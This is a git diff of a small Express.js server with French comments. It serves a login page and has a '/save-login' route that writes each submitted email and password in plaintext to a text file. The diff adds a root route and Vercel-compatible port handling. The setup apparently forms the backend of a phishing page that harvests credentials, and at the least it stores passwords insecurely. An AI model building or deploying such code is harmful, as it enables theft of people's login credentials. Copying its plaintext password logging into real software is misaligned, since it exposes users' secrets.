@@ -4,19 +4,23 @@ const fs = require("fs");
 const path = require("path");
 
 const app = express();
-const PORT = 3000;
 
-// Middleware pour servir les fichiers statiques
+// Middleware pour servir les fichiers statiques dans le dossier "public"
 app.use(express.static(path.join(__dirname, "public")));
 
 // Middleware pour parser les données du formulaire
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Route pour enregistrer les données
+// Route par défaut pour afficher la page d'accueil
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "index.html"));
+});
+
+// Route pour enregistrer les données du login
 app.post("/save-login", (req, res) => {
   const { email, password } = req.body;
 
-  // Format des données
+  // Format des données à enregistrer
   const logEntry = `Email: ${email}, Password: ${password}\n`;
 
   // Enregistrer les données dans un fichier texte
@@ -30,7 +34,8 @@ app.post("/save-login", (req, res) => {
   });
 });
 
-// Démarrer le serveur
+// Démarrer le serveur sur le port spécifié par Vercel ou 3000 par défaut
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Serveur démarré sur http://localhost:${PORT}`);
 });
